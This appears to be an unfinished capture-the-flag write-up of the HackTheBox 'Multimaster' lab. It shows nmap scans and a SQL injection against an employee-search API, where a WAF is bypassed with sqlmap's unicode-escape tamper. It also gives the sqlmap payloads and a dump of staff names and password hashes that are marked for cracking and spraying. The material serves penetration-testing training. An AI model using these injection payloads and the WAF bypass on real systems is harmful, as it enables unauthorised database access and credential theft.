# Multimaster

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.95.200
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 22:20 +08
Nmap scan report for 10.129.95.200
Host is up (0.011s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49678/tcp open  unknown
49687/tcp open  unknown
49694/tcp open  unknown
```

RDP is available for this machine, which is not the usual for HackTheBox machines. I did a detailed `nmap` scan just in case:

```
$ sudo nmap -p 53,80,88,135,139,445,464,593,636,3268,3269,3389,5985,9389 -sC -sV -O -min-rate 3000 10.129.95.200
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 22:21 +08
Nmap scan report for 10.129.95.200
Host is up (0.013s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: MegaCorp
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-25 14:28:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|   Product_Version: 10.0.14393
|_  System_Time: 2023-06-25T14:28:47+00:00
|_ssl-date: 2023-06-25T14:29:27+00:00; +6m55s from scanner time.
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2023-06-24T14:09:53
|_Not valid after:  2023-12-24T14:09:53
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607
Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-06-25T14:28:49
|_  start_date: 2023-06-25T14:10:02
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: MULTIMASTER
|   NetBIOS computer name: MULTIMASTER\x00
|   Domain name: MEGACORP.LOCAL
|   Forest name: MEGACORP.LOCAL
|   FQDN: MULTIMASTER.MEGACORP.LOCAL
|_  System time: 2023-06-25T07:28:51-07:00
|_clock-skew: mean: 1h30m55s, deviation: 3h07m51s, median: 6m54s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
```

We can add `megacorp.local` and the `multimaster.megacorp.local` domains to our `/etc/hosts` file for this machine.&#x20;

### SMB Enumeration

SMB does not allow us to access anything without credentials for this machine.&#x20;

### Employee Hub

Port 80 shows us a dashboard of some sorts:

<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

There were some functions, and the one that stood out was the 'Colleague Finder', which took one name parameter.

<figure><img src="../../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

If nothing is entered, then all the employees are returned.

<figure><img src="../../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

We can take note of these usernames for later. More importantly, we should see how this thing processes queries. When viewed in Burpsuite, the request simply sent a POST request to `/api/getColleagues` and it returns a response.

<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

This looks vulnerable to SQL Injection somehow. Every form of injection I tried resulted in a 403 being returned. I noticed one thing however, the `Content-Type` header said that this app accepts UTF-8 characters.&#x20;

UTF-8 characters are a bit special as they are denoted like `\u12` or something. If I try to use `\u12` as the input, I get an error instead of being blocked.

<figure><img src="../../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

This likely indicates that our query has caused a backend error. Using this, we can try some of the `sqlmap` tampers that are available:

{% embed url="https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap" %}

Tampers are basically scripts that change the characters being sent in to the website. There's a `charunicodeescape` option that we can try. The final command looks something like this:

```
$ sqlmap -r req --tamper=charunicodeescape --level 5 --risk 3
```

The initial attempt tells me there's nothing, and that all requests ended in 403. I tried again with a `--delay 3` flag in case there was a WAF blocking my access, and it works. The final command I used was:

```
$ sqlmap -r req --tamper=charunicodeescape --level 5 --risk 3 --batch --dbms=mssql --delay 3
```

> The guess of the DBMS being MS-SQL was purely a guess based on usual HTB machine patterns, but obviously this is not always the case! Windows AD can use SQLite3 or MySQL for their backends, especially for web servers!&#x20;

{% code overflow="wrap" %}
```
[22:58:39] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable
[22:59:04] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[22:59:17] [INFO] target URL appears to have 5 columns in query
[23:00:51] [INFO] (custom) POST parameter 'JSON #1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable                                                                         
(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 70 HTTP(s) requests:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"name":"' AND 4943=4943-- fsuJ"}

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: {"name":"';WAITFOR DELAY '0:0:5'--"}

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: {"name":"' WAITFOR DELAY '0:0:5'-- tWyh"}

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: {"name":"-5737' UNION ALL SELECT 68,68,68,CHAR(113)+CHAR(107)+CHAR(113)+CHAR(107)+CHAR(113)+CHAR(99)+CHAR(103)+CHAR(105)+CHAR(67)+CHAR(121)+CHAR(77)+CHAR(74)+CHAR(122)+CHAR(117)+CHAR(85)+CHAR(75)+CHAR(99)+CHAR(110)+CHAR(99)+CHAR(76)+CHAR(72)+CHAR(99)+CHAR(70)+CHAR(69)+CHAR(77)+CHAR(120)+CHAR(120)+CHAR(107)+CHAR(106)+CHAR(68)+CHAR(103)+CHAR(66)+CHAR(101)+CHAR(104)+CHAR(118)+CHAR(89)+CHAR(79)+CHAR(117)+CHAR(78)+CHAR(113)+CHAR(76)+CHAR(101)+CHAR(67)+CHAR(71)+CHAR(100)+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113),68-- wUMy"}
```
{% endcode %}

Great! Now that we have this, we can attempt to enumerate the database. Here are the results from repeated use of `sqlmap`:

```
Tables:
[23:01:49] [INFO] fetching tables for databases: Hub_DB, master, model, msdb, tempdb


Dumping of Hub_DB:
Database: Hub_DB
Table: Colleagues
[17 entries]
+----+----------------------+----------------------+-------------+----------------------+
| id | name                 | email                | image       | position             |
+----+----------------------+----------------------+-------------+----------------------+
| 1  | Sarina Bauer         | sbauer@megacorp.htb  | sbauer.jpg  | Junior Developer     |
| 2  | Octavia Kent         | okent@megacorp.htb   | okent.jpg   | Senior Consultant    |
| 3  | Christian Kane       | ckane@megacorp.htb   | ckane.jpg   | Assistant Manager    |
| 4  | Kimberly Page        | kpage@megacorp.htb   | kpage.jpg   | Financial Analyst    |
| 5  | Shayna Stafford      | shayna@megacorp.htb  | shayna.jpg  | HR Manager           |
| 6  | James Houston        | james@megacorp.htb   | james.jpg   | QA Lead              |
| 7  | Connor York          | cyork@megacorp.htb   | cyork.jpg   | Web Developer        |
| 8  | Reya Martin          | rmartin@megacorp.htb | rmartin.jpg | Tech Support         |
| 9  | Zac Curtis           | zac@magacorp.htb     | zac.jpg     | Junior Analyst       |
| 10 | Jorden Mclean        | jorden@megacorp.htb  | jorden.jpg  | Full-Stack Developer |
| 11 | Alyx Walters         | alyx@megacorp.htb    | alyx.jpg    | Automation Engineer  |
| 12 | Ian Lee              | ilee@megacorp.htb    | ilee.jpg    | Internal Auditor     |
| 13 | Nikola Bourne        | nbourne@megacorp.htb | nbourne.jpg | Head of Accounts     |
| 14 | Zachery Powers       | zpowers@megacorp.htb | zpowers.jpg | Credit Analyst       |
| 15 | Alessandro Dominguez | aldom@megacorp.htb   | aldom.jpg   | Senior Web Developer |
| 16 | MinatoTW             | minato@megacorp.htb  | minato.jpg  | CEO                  |
| 17 | egre55               | egre55@megacorp.htb  | egre55.jpg  | CEO                  |
+----+----------------------+----------------------+-------------+----------------------+

Database: Hub_DB
Table: Logins
[17 entries]
+----+--------------------------------------------------------------------------------------------------+----------+
| id | password                                                                                         | username |
+----+--------------------------------------------------------------------------------------------------+----------+
| 1  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | sbauer   |
| 2  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | okent    |
| 3  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ckane    |
| 4  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | kpage    |
| 5  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | shayna   |
| 6  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | james    |
| 7  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | cyork    |
| 8  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | rmartin  |
| 9  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zac      |
| 10 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | jorden   |
| 11 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | alyx     |
| 12 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ilee     |
| 13 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | nbourne  |
| 14 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zpowers  |
| 15 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | aldom    |
| 16 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | minatotw |
| 17 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | egre55   |
+----+--------------------------------------------------------------------------------------------------+----------+
```

Loads of hashes. We can crack all of these and do a password spray with `crackmapexec`.&#x20;

WIP.
